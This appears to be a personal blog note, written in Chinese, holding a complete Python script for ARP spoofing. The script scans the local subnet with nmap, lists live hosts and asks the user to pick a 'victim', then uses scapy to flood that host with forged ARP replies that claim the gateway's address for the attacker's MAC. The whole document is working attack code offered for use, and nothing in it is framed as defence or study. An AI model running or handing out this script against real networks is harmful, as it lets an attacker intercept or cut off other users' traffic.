---
title: python-ARP攻击
tags:
  - blog
  - python
date: 2023-08-14
lastmod: 2023-08-14
categories:
  - blog
description: "[[笔记/point/python|python]] 的 ARP 攻击脚本."
---

## 简介

[[笔记/point/python|python]] 的 ARP 攻击脚本.

## 内容

```python
# coding:utf-8

from scapy.all import Ether, ARP, sendp
from typing import Tuple
import os
import pprint
import socket
import netifaces
import nmap
import time


def get_localhost_mac_address_and_gateway_ip(localhost_ip: str) -> Tuple[str, str]:
    tmp_data = localhost_ip.split(".")[0:3]
    tmp_data.append("1")
    gateway_ip = ".".join(tmp_data)

    for gateway in netifaces.gateways().get(len(netifaces.gateways())):
        if gateway[0] == gateway_ip:
            mac_id = gateway[1]

    mac_addr = netifaces.ifaddresses(mac_id).get(netifaces.AF_LINK)[0]["addr"].upper()
    return (gateway_ip, mac_addr)

    # linux 系统
    # addrs = netifaces.ifaddresses("en0")
    # mac_address = addrs[netifaces.AF_LINK]
    # return mac_address[0]["addr"]


def get_localhost_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("114.114.114.114", 80))
        ip, port = s.getsockname()
    finally:
        s.close()
    return ip


def get_hostname_by_id(ip) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


source_ip = get_localhost_ip()
print(f"本机ip地址：{source_ip}")
gateway_ip, source_mac = get_localhost_mac_address_and_gateway_ip(source_ip)
print(f"本机mac地址：{source_mac}")
print(f"网关地址{gateway_ip}")

target_mac = "E0:DC:FF:CD:CF:51"
print(f"目标mac地址：{target_mac}")
target_ip = "192.168.0.105"
print(f"目标ip地址：{target_ip}")


def scan(gateway_ip) -> list:
    ## 开始扫描
    print("开始扫描")
    start_time = time.time()

    nm = nmap.PortScanner()
    nm.scan(f"{gateway_ip}/24", arguments="sP")

    print("完成扫描")
    end_time = time.time()
    print(f"耗时：{end_time-start_time}秒")

    alive_hosts = [
        host for host in nm.all_hosts() if nm[host]["status"]["state"] == "up"
    ]

    datas = [
        (
            nm[host]["addresses"]["ipv4"],
            nm[host]["addresses"]["mac"],
            nm[host]["vendor"].get(nm[host]["addresses"]["mac"], ""),
            get_hostname_by_id(nm[host]["addresses"]["ipv4"])
            # 保存端口信息 nm[host].get("tcp", {}),
        )
        for host in alive_hosts
        if host != source_ip
    ]
    print("序号 ip地址 mac地址 设备提供商 主机名")
    for key, data in enumerate(datas):
        print(f"{key}：{data}")

    return datas


datas = scan(gateway_ip)

while True:
    attack_host_num = input("请输入想要攻击的机器(如果大于机器列表会重新扫描):\n")
    if int(attack_host_num) > len(datas):
        datas = scan(gateway_ip)
    else:
        break


target_ip = datas[int(attack_host_num)][0]
target_mac = datas[int(attack_host_num)][1]

print(f"受害者ip修改为:{target_ip}")
print(f"受害者mac修改为:{target_mac}")

# 开始攻击
ether = Ether(src=source_mac, dst=target_mac)
# 这里的op参数1是请求,2是响应
arp = ARP(
    hwsrc=source_mac,
    psrc=gateway_ip,
    hwdst=target_mac,
    pdst=target_ip,
    op=2,
)
pkg = ether / arp
pkg.show()

# inter代表每个包之间的间隔时间.loop代表循环发包
sendp(pkg, inter=0, loop=1)

```
